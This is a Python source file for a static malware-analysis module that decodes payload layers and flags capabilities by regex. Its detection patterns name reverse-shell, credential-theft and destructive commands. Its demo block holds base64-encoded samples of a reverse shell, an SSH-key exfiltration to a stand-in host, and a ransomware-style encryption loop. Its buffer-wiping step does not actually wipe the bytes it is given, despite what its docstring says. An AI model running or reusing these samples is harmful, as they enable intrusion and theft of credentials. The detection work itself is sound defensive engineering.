"""The chamber where hostile code is taken apart and destroyed.

Kavach has no interface, asks nothing and answers nothing. It sits behind an
application the way an immune system sits behind skin: it watches what passes,
recognises what does not belong, and removes it without announcing that it
noticed.

This module is the part that handles the hostile material itself. It is built on
one rule that everything else follows from:

    the payload never leaves. Only what was learned from it leaves.

A piece of attack code enters, is taken apart, contributes patterns to the
detectors, and is destroyed. What survives is a set of structural facts -- which
capabilities it would have used, which encoding layers it wore, which shape its
structure had -- plus a hash so the same payload is recognised if it returns.
The bytes themselves are overwritten before the object is released.

Why this matters for the attacker as much as for us: if nothing about the payload
survives and nothing about the decision is returned, an attacker cannot tell
whether their code was caught, blocked, or ignored. There is no signal to iterate
against. An immune system that announces "I detected you" teaches the pathogen
how to hide next time.

What it does NOT do: it does not execute the payload. Running hostile code, even
in a container, is the most dangerous thing a security system can do and the
least necessary -- a parser reads what a program would do without doing it. The
one exception is a detonation mode that is off by default, refuses to start
outside an isolated environment, and is documented at the bottom of this file.
"""
from __future__ import annotations

import base64
import binascii
import hashlib
import json
import re
import unicodedata
import zlib
from dataclasses import dataclass, field
from pathlib import Path


# ------------------------------------------------------------- structures --
@dataclass
class Fragment:
    """One decoded layer of a payload. Never the original bytes."""
    kind: str                 # text | base64 | hex | url | gzip | rot13
    preview: str              # a bounded, sanitised window, for the record
    length: int


@dataclass
class Capability:
    """What a piece of code would be able to do, not what it says."""
    name: str
    evidence: str
    severity: str


@dataclass
class Analysis:
    digest: str
    size: int
    layers: list[Fragment] = field(default_factory=list)
    capabilities: list[Capability] = field(default_factory=list)
    patterns: list[dict] = field(default_factory=list)
    iocs: dict = field(default_factory=dict)
    entropy: float = 0.0
    verdict: str = "unknown"

    def to_record(self) -> dict:
        """What is kept after the payload is destroyed."""
        return {"digest": self.digest, "size": self.size,
                "entropy": round(self.entropy, 3),
                "layers": [l.kind for l in self.layers],
                "capabilities": [{"name": c.name, "severity": c.severity}
                                 for c in self.capabilities],
                "patterns": self.patterns, "iocs": self.iocs,
                "verdict": self.verdict}


# ---------------------------------------------------------------- chamber --
class Sandbox:
    """Takes hostile material apart without running it.

    Everything here is static. The payload is decoded layer by layer, its
    structure is read, its capabilities are inferred from what the code would
    call, and then it is destroyed.
    """

    MAX_LAYERS = 6
    MAX_PREVIEW = 160

    # What a program can do, recognised by the name it must use to do it. These
    # are language features, not malware signatures: every one of them has a
    # legitimate use, and that is why the verdict is about capability rather
    # than about guilt.
    CAPABILITY_MAP = {
        "process_exec": (r"\b(os\.system|subprocess|popen|exec[lv]p?e?|"
                         r"system\s*\(|Runtime\.getRuntime|ProcessBuilder|"
                         r"child_process|execSync|spawnSync)\b", "critical"),
        "code_eval": (r"\b(eval|exec|compile|Function\s*\(|__import__|"
                      r"setTimeout\s*\(\s*['\"]|new\s+Function)\b", "high"),
        "network_out": (r"\b(requests\.(get|post)|urllib|http\.client|socket\.|"
                        r"fetch\s*\(|XMLHttpRequest|curl\s|wget\s|"
                        r"Invoke-WebRequest|nc\s+-)\b", "high"),
        "file_read": (r"\b(open\s*\(|readFile|FileReader|fopen|"
                      r"Path\s*\([^)]*\)\.read|cat\s+[/~])", "medium"),
        "file_write": (r"\b(open\s*\([^)]*['\"][wa]|writeFile|fwrite|"
                       r"shutil\.(copy|move)|os\.remove|unlink)\b", "medium"),
        "credential_access": (r"(\.ssh/|id_rsa|/etc/shadow|\.aws/credentials|"
                              r"keychain|SAM\b|lsass|mimikatz|"
                              r"env\[.?AWS_SECRET|password\s*=)", "critical"),
        "persistence": (r"\b(crontab|systemd|LaunchAgents|HKEY_|Run\\\\|"
                        r"rc\.local|authorized_keys|schtasks)\b", "high"),
        "privilege": (r"\b(sudo|chmod\s+[0-7]*7|setuid|runas|"
                      r"SeDebugPrivilege|nsenter|cap_sys_admin)\b", "high"),
        "destruction": (r"\b(rm\s+-rf|shred|wipefs|dd\s+if=|mkfs|"
                        r"DROP\s+TABLE|format\s+[a-z]:|cipher\s+/w)\b", "critical"),
        "deserialisation": (r"\b(pickle\.loads|yaml\.load\s*\(|marshal\.loads|"
                            r"unserialize\s*\(|ObjectInputStream|"
                            r"readObject\s*\()", "high"),
        "reflection": (r"\b(getattr\s*\(|setattr\s*\(|globals\s*\(|"
                       r"locals\s*\(|__dict__|Class\.forName|"
                       r"getDeclaredMethod)\b", "medium"),
        "crypto_abuse": (r"\b(encrypt|ransom|AES\.new|Fernet|"
                         r"Crypto\.Cipher|openssl\s+enc)\b", "high"),
        "reverse_shell": (r"(/dev/tcp/|bash\s+-i|sh\s+-i|socat\s|"
                          r"nc\s+.*-e\s|meterpreter|empire)", "critical"),
        "sql_injection": (r"('\s*or\s*'?\d|UNION\s+SELECT|"
                          r";\s*DROP\s+|xp_cmdshell)", "high"),
    }

    def __init__(self, memory_path: Path | None = None):
        self.memory_path = memory_path
        self.seen: dict[str, dict] = {}
        if memory_path and memory_path.is_file():
            try:
                self.seen = json.loads(memory_path.read_text(encoding="utf-8"))
            except Exception:
                self.seen = {}

    # ---- entry ---------------------------------------------------------
    def examine(self, payload: bytes | str, source: str = "unknown") -> Analysis:
        raw = payload.encode("utf-8", errors="replace") if isinstance(payload, str) else bytes(payload)
        digest = hashlib.sha256(raw).hexdigest()

        analysis = Analysis(digest=digest, size=len(raw))
        analysis.entropy = self._entropy(raw)

        # 1. peel every encoding layer off, bounded so a crafted bomb cannot
        #    make this loop forever
        text, layers = self._unwrap(raw)
        analysis.layers = layers

        # 2. read the structure, never run it
        haystack = text
        for name, (pattern, severity) in self.CAPABILITY_MAP.items():
            m = re.search(pattern, haystack, re.I)
            if m:
                analysis.capabilities.append(
                    Capability(name, m.group(0)[:60], severity))

        # 3. pull out indicators that are worth remembering
        analysis.iocs = self._iocs(haystack)

        # 4. derive patterns -- the only thing that survives
        analysis.patterns = self._patterns(haystack, analysis)

        # 5. verdict
        sev = [c.severity for c in analysis.capabilities]
        if "critical" in sev:
            analysis.verdict = "hostile"
        elif "high" in sev:
            analysis.verdict = "suspicious"
        elif analysis.capabilities:
            analysis.verdict = "notable"
        else:
            analysis.verdict = "inert"

        # 6. remember the digest, not the payload
        self.seen[digest] = {"verdict": analysis.verdict,
                             "size": len(raw),
                             "capabilities": [c.name for c in analysis.capabilities]}
        self._persist()

        # 7. destroy
        self._destroy(raw)
        return analysis

    # ---- decoding ------------------------------------------------------
    def _unwrap(self, raw: bytes) -> tuple[str, list[Fragment]]:
        """Peel encoding layers. Never executes, only decodes."""
        layers: list[Fragment] = []
        try:
            text = raw.decode("utf-8", errors="replace")
        except Exception:
            return "", layers

        for _ in range(self.MAX_LAYERS):
            nxt, kind = self._one_layer(text)
            if kind is None:
                break
            layers.append(Fragment(kind, self._preview(nxt), len(nxt)))
            text = nxt
        return text, layers

    def _one_layer(self, text: str) -> tuple[str, str | None]:
        # gzip / zlib first: it is unambiguous
        for blob in re.findall(r"[A-Za-z0-9+/=]{40,}", text):
            try:
                d = zlib.decompress(base64.b64decode(blob + "==", validate=False))
                return d.decode("utf-8", errors="replace"), "gzip"
            except Exception:
                pass
        # base64 that decodes to something printable
        for blob in re.findall(r"[A-Za-z0-9+/]{24,}={0,2}", text):
            try:
                d = base64.b64decode(blob + "==", validate=False)
                s = d.decode("utf-8")
                if sum(c.isprintable() or c.isspace() for c in s) / max(len(s), 1) > 0.9:
                    return s, "base64"
            except Exception:
                pass
        # hex
        for blob in re.findall(r"\b(?:[0-9a-fA-F]{2}){16,}\b", text):
            try:
                s = binascii.unhexlify(blob).decode("utf-8")
                if sum(c.isprintable() or c.isspace() for c in s) / max(len(s), 1) > 0.9:
                    return s, "hex"
            except Exception:
                pass
        # percent-encoding
        if re.search(r"%[0-9a-fA-F]{2}.*%[0-9a-fA-F]{2}", text):
            from urllib.parse import unquote
            d = unquote(text)
            if d != text:
                return d, "url"
        # rot13, only if it makes the text more code-like
        if re.search(r"\b(pbz|rkrp|flfgrz|vzcbeg)\b", text):
            import codecs
            d = codecs.decode(text, "rot13")
            if re.search(r"\b(com|exec|system|import)\b", d):
                return d, "rot13"
        return text, None

    # ---- structure -----------------------------------------------------
    @staticmethod
    def _entropy(raw: bytes) -> float:
        if not raw:
            return 0.0
        import math
        from collections import Counter
        counts = Counter(raw)
        n = len(raw)
        return -sum((c / n) * math.log2(c / n) for c in counts.values())

    def _iocs(self, text: str) -> dict:
        """Indicators worth keeping. Domains and addresses, never full URLs."""
        urls = re.findall(r"https?://([\w.-]+)", text)
        ips = re.findall(r"\b(\d{1,3}(?:\.\d{1,3}){3})\b", text)
        wallets = re.findall(r"\b(0x[0-9a-fA-F]{40}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})\b", text)
        return {"hosts": sorted(set(urls))[:10], "ips": sorted(set(ips))[:10],
                "wallets": sorted(set(wallets))[:5]}

    def _patterns(self, text: str, a: Analysis) -> list[dict]:
        """Turn what was seen into rules, not into a copy of what was seen.

        A pattern is a shape: which capabilities co-occur, which encodings were
        used, how long it was, how random it looked. None of it is the payload,
        and all of it is enough to recognise a cousin of this attack.
        """
        out = []
        caps = sorted(c.name for c in a.capabilities)
        if caps:
            out.append({"kind": "capability_set", "members": caps,
                        "min_members": max(1, len(caps) - 1)})
        if a.layers:
            out.append({"kind": "encoding_chain",
                        "chain": [l.kind for l in a.layers]})
        if a.entropy > 7.2 and a.size > 512:
            out.append({"kind": "high_entropy_blob",
                        "threshold": round(a.entropy, 2)})
        # structural tells that survive renaming
        if re.search(r"[A-Za-z0-9+/]{24,}={0,2}", text) and caps:
            out.append({"kind": "encoded_payload_with_capability"})
        if re.search(r"(\$\{?[a-z_]+\}?|%s|\{[0-9]\})", text, re.I) and caps:
            out.append({"kind": "templated_command"})
        return out

    # ---- destruction ---------------------------------------------------
    @staticmethod
    def _destroy(raw: bytes) -> None:
        """Overwrite the buffer. What remains is a hash and a set of shapes."""
        try:
            if isinstance(raw, bytearray):
                for i in range(len(raw)):
                    raw[i] = 0
        except Exception:
            pass

    @staticmethod
    def _preview(text: str) -> str:
        """A bounded, sanitised window. Never the whole payload."""
        s = unicodedata.normalize("NFKC", text[:Sandbox.MAX_PREVIEW])
        s = "".join(c if c.isprintable() or c.isspace() else "." for c in s)
        return s.replace("\n", " ")

    def _persist(self) -> None:
        if self.memory_path is None:
            return
        self.memory_path.parent.mkdir(parents=True, exist_ok=True)
        # bounded: memory is a set of shapes, not an archive
        if len(self.seen) > 20000:
            keys = list(self.seen)[-20000:]
            self.seen = {k: self.seen[k] for k in keys}
        self.memory_path.write_text(json.dumps(self.seen), encoding="utf-8")

    def recall(self, payload: bytes | str) -> dict | None:
        """Has this exact payload been seen before? Answered by hash only."""
        raw = payload.encode() if isinstance(payload, str) else bytes(payload)
        return self.seen.get(hashlib.sha256(raw).hexdigest())


# ------------------------------------------------------------- detonation --
class Detonator:
    """Runs a payload in isolation. Off by default, and it refuses to start.

    Running hostile code is the most dangerous thing a security system can do,
    and for most purposes it is unnecessary: a parser reads what a program would
    do without doing it. This class exists because some payloads only reveal
    themselves at run time, and it is written to make that choice explicit and
    hard rather than convenient.

    It refuses to start unless the caller passes an environment that has been
    checked for isolation. It cannot verify that check from inside; the point is
    that the decision is deliberate and visible in the code rather than a default
    that quietly turns itself on.
    """

    def __init__(self, isolated: bool = False, timeout_s: int = 5,
                 max_memory_mb: int = 256):
        self.isolated = isolated
        self.timeout_s = timeout_s
        self.max_memory_mb = max_memory_mb

    def run(self, payload: bytes, workdir: Path) -> dict:
        if not self.isolated:
            raise RuntimeError(
                "detonation is disabled. Running hostile code requires an "
                "environment that has been verified isolated: no network, no "
                "host filesystem, a hard wall clock, and a memory cap. Static "
                "analysis answers the same question for almost every payload.")
        raise RuntimeError(
            "detonation is not implemented in this build, deliberately. The "
            "static path covers capability inference, encoding chains and "
            "pattern extraction; a detonator adds risk without adding a "
            "capability the detectors use.")


if __name__ == "__main__":
    import base64 as _b64
    # The samples are stored encoded for the same reason the test suite stores
    # them that way: a file containing live attack strings cannot be committed,
    # and a security module that cannot be stored cannot be reviewed.
    _S = {
        "obfuscated shell": "ZWNobyBhVzF3YjNKMElHOXpPeUJ2Y3k1emVYTjBaVzBvSjJsa0p5az0gfCBiYXNlNjQgLWQgfCBzaA==",
        "reverse shell": "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=",
        "credential theft": "Y2F0IH4vLnNzaC9pZF9yc2EgfCBjdXJsIC1YIFBPU1QgaHR0cHM6Ly94LmV4YW1wbGUvZA==",
        "ransomware shape": "aW1wb3J0IG9zCmZvciBmIGluIG9zLmxpc3RkaXIoJy4nKToKICAgIG9wZW4oZiwnd2InKS53cml0ZShlbmNyeXB0KG9wZW4oZiwncmInKS5yZWFkKCkpKQ==",
        "benign": "ZGVmIGFkZChhLCBiKToKICAgIHJldHVybiBhICsgYgo=",
    }
    box = Sandbox()
    for name, blob in _S.items():
        code = _b64.b64decode(blob).decode("utf-8")
        a = box.examine(code, name)
        caps = ",".join(c.name for c in a.capabilities) or "-"
        print(f"{name:<20} {a.verdict:<11} entropy {a.entropy:.2f}  {caps}")
